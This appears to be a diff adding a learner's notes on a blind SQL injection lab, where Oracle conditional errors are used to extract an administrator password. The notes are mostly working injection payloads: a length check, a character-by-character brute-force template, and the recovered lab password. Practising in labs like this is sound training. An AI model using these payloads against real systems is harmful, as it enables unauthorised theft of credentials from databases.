@@ -1,0 +1,33 @@
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user
+
+
+table: users, 
+columns: username, passwor
+
+possibly using this:
+' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING((SELECT password FROM users),1,1) = 'a') THEN 1/0 ELSE 'a' END) = 'a'
+
+always test first that the backend is being used as an SQQL query
+can use this command:
+'||(SELECT '' FROM PREDICTABLE_TABLE_NAME)||'
+
+use dual for the table name as dual always exists in Oracle
+
+
+password is length 20
+found using:
+'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+This returns a 500 error indicating the input SQL is true that the password is 20 chars in length
+
+This is my SQL injection to test if a certain position of the password is matching a letter or number given:
+'||(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username = 'administrator'),§1§,1) = '§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+payload 1: number list
+payload 2: brute force alaphanumeric list
+
+after brute forcing i obtained the password for the user administrator:
+kwxc2tp31zmgo3oyg5ef
